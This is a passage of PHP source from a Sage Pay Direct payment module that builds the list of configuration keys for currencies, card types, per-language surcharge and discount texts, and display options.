			'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPTED_CURRENCIES',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_DEFAULT_CURRENCY',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_AUTHORISATION_TYPE',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_ENABLE_SURCHARGES_DISCOUNTS',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_SHOPCART',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_SHOPCART_ADD_MODEL_NUM',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_ZONE',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_ORDER_STATUS_ID',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_STORE_DETAILS_IN_SESSION',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_USE_BLOWFISH',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_ENCRYPTION_KEYPHRASE',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_AVS_SETTINGS',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_3D_SECURE_SETTINGS',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_DISABLE_CARD_NUMBER_AUTOCOMPLETE',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_DISABLE_CVV_AUTOCOMPLETE',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_VISA',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_VISA');
		
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_VISA_SHORT_' . $languages[$i]['id'];
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_VISA_LONG_' . $languages[$i]['id'];
		}
		
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_MC';
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_MC';
		
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_MC_SHORT_' . $languages[$i]['id'];
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_MC_LONG_' . $languages[$i]['id'];
		}
		
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_VISA_DEBIT';
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_DELTA'; // Code for "Visa Debit" is "DELTA"
		
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_DELTA_SHORT_' . $languages[$i]['id'];
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_DELTA_LONG_' . $languages[$i]['id'];
		}
		
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_SOLO';
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_SOLO';
		
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_SOLO_SHORT_' . $languages[$i]['id'];
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_SOLO_LONG_' . $languages[$i]['id'];
		}
		
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_MAESTRO';
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_MAESTRO';
		
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_MAESTRO_SHORT_' . $languages[$i]['id'];
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_MAESTRO_LONG_' . $languages[$i]['id'];
		}
		
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_VISA_ELECTRON';
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_UKE'; // Code for "Visa Electron" is "UKE"
		
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_UKE_SHORT_' . $languages[$i]['id'];
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_UKE_LONG_' . $languages[$i]['id'];
		}
		
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_AMEX';
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_AMEX';
		
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_AMEX_SHORT_' . $languages[$i]['id'];
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_AMEX_LONG_' . $languages[$i]['id'];
		}
		
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_DC';
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_DC';
		
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_DC_SHORT_' . $languages[$i]['id'];
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_DC_LONG_' . $languages[$i]['id'];
		}
		
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_JCB';
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_JCB';
		
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_JCB_SHORT_' . $languages[$i]['id'];
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_JCB_LONG_' . $languages[$i]['id'];
		}
		
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_LASER';
		$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_LASER';
		
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_LASER_SHORT_' . $languages[$i]['id'];
			$keys[] = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_LASER_LONG_' . $languages[$i]['id'];
		}
		
		$remaining_keys = array(
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_SHOW_CARDS_ACCEPTED',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_SELECT_MONTH_FORMAT',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_SELECT_YEAR_FORMAT',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_CARDS_ACCEPTED_SIDEBOX_SHOW_SAGE_PAY_LOGO',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_CARDS_ACCEPTED_SIDEBOX_SHOW_PROTX_LOGO',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_ENABLE_CUSTOM_SURCHARGES_DISCOUNTS_MESSAGE',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_SORT_ORDER',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_DEBUGGING_ENABLED',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_MADE_BY_CEON'
			);
		
		$keys = array_merge($keys, $remaining_keys);
		
		return $keys;
	}
}

// }}}

?>